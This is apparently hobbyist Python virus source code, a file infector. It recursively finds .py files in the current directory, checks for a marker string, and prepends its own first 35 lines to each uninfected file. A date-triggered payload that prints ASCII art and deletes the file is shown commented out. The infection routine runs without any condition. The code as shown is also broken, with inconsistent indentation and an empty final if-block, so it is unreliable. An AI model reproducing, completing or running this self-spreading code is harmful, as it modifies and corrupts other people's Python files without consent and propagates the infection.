import os
import datetime
sign = "Dann!ee!!eeeeeee~"
def search(path):
    FTI = [] # list of files to infect
    filelist = os.listdir(path)
    for name in filelist:
        if os.path.isdir(path+"/"+name):
            FTI.extend(search(path+"/"+name))
        elif name[-3:] == ".py": #If the file extensions is .py
            infected = False
            for line in open(path+"/"+name): #Determine which is infected
                if sign in line:
                    infected = True
                    break
            if infected == False:
                FTI.append(path+"/"+name)
    return FTI
def infect(FTI):
    virus = open(os.path.abspath(__file__)) #Open this file
    code = ""
    for i,line in enumerate(virus):
        if i>=0 and i <35:
            code += line
    virus.close
    for name in FTI: #To write code on other program
        f = open(name)
        temp = f.read()
        f.close()
        f = open(name,"w")
        f.write(code + temp)
        f.close()
def Payload():
    print("     OOOOOOOOO     hhhhhhh                                                      !!! ")
        print("   OO:::::::::OO   h:::::h                                                     !!:!!")
        print(" OO:::::::::::::OO h:::::h                                                     !:::!")
        print("O:::::::OOO:::::::Oh:::::h                                                     !:::!")
        print("O::::::O   O::::::O h::::h hhhhh            nnnn  nnnnnnnn       ooooooooooo   !:::!")
        print("O::::::O   O::::::O h::::h hhhhh            nnnn  nnnnnnnn       ooooooooooo   !:::!")
        print("O:::::O     O:::::O h::::hh:::::hhh         n:::nn::::::::nn   oo:::::::::::oo !:::!")
        print("O:::::O     O:::::O h::::::::::::::hh       n::::::::::::::nn o:::::::::::::::o!:::!")
        print("O:::::O     O:::::O h:::::::hhh::::::h      nn:::::::::::::::no:::::ooooo:::::o!:::!")
        print("O:::::O     O:::::O h::::::h   h::::::h       n:::::nnnn:::::no::::o     o::::o!:::!")
        print("O:::::O     O:::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o!:::!")
        print("O:::::O     O:::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o!!:!!")
        print("O::::::O   O::::::O h:::::h     h:::::h       n::::n    n::::no::::o     o::::o !!! ")
        print("O:::::::OOO:::::::O h:::::h     h:::::h       n::::n    n::::no:::::ooooo:::::o     ")
        print(" OO:::::::::::::OO  h:::::h     h:::::h       n::::n    n::::no:::::::::::::::o !!! ")
        print("   OO:::::::::OO    h:::::h     h:::::h       n::::n    n::::n oo:::::::::::oo !!:!!")
        print("     OOOOOOOOO      hhhhhhh     hhhhhhh       nnnnnn    nnnnnn   ooooooooooo    !!! ")
        print(__file__ + ": I've got you! Catch me if you can!")
        os.remove(os.path.abspath(__file__))
FTI = search(os.path.abspath("")) #Search
infect(FTI) #Infect
if datetime.datetime.now().month == 8 and datetime.datetime.now().day == 11:
    #Payload() #For safety!
